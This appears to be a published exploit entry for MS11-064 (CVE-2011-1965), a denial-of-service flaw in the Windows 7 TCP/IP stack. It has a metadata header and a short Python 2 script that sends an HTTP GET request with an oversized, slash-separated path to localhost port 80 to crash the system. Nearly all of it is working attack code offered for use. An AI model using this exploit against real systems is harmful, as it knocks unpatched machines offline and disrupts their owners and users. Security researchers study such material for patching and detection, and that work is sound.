# Exploit Title: MS11-064 : Vulnerabilities in TCP/IP Stack Could
Allow Denial of Service
# Date: 10/12/2011
# Author: Byoungyoung Lee, http://www.cc.gatech.edu/~blee303/
# Version: Windows 7 32bit, fully patched until Aug 2011
# Tested on: Windows 7 32bit
# CVE : CVE-2011-1965
 
# analysis is available -
http://exploitshop.wordpress.com/2011/09/07/ms11-064-vulnerabilities-in-tcpip-stack-could-allow-denial-of-service-2563894/
 
------------------------------------------------------------------------------------------------------
# Byoungyoung Lee, http://twitter.com/mylifeasageek
import struct
import socket
 
HOST = "localhost" # yeah, we've tried this as a local kernel exploit -:)
PORT= 80
 
def tryOnce(i,j):
    print hex(i), hex(j)
    filename = ["a"*0x100 for x in range(i)]
 
    filename = "/".join(filename)
    filename += "/" + "b" * j
    print "filename len : ", hex(len(filename))
 
    hostname = "www.darungrim.org"
 
    header = "GET /%s\n" % filename
    header += "HOST: %s\n\n\n" % hostname
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.send(header)
    response = s.recv(1024)
    s.close()
    print response
    return
 
if __name__ == '__main__':
    tryOnce(0x3c,0x7)
